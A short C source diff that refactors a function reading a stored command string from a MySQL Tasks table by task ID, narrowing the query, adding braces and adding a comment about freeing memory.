@@ -188,16 +188,26 @@ void LogsTable(struct db_logs args) {
     mysql_query(con, query);
 }
 
-
 char *cmd_and_response(int task_id) {
-    char query[1024];
-    snprintf(query, sizeof(query), "SELECT command, response FROM Tasks WHERE task_id = %d;", task_id);
-    if (mysql_query(con, query)) return NULL;
+    char query[256];
+    snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);
+
+    if (mysql_query(con, query)) {
+        return NULL;
+    }
+
     MYSQL_RES *result = mysql_store_result(con);
-    if (result == NULL) return NULL;
+    if (result == NULL) {
+        return NULL;
+    }
+
     MYSQL_ROW row = mysql_fetch_row(result);
     char *cmd = NULL;
-    if (row && row[0]) cmd = strdup(row[0]);
+
+    if (row && row[0]) {
+        cmd = strdup(row[0]);  // Copy command string
+    }
+
     mysql_free_result(result);
-    return cmd;
+    return cmd;  // Must be freed by the caller
 }
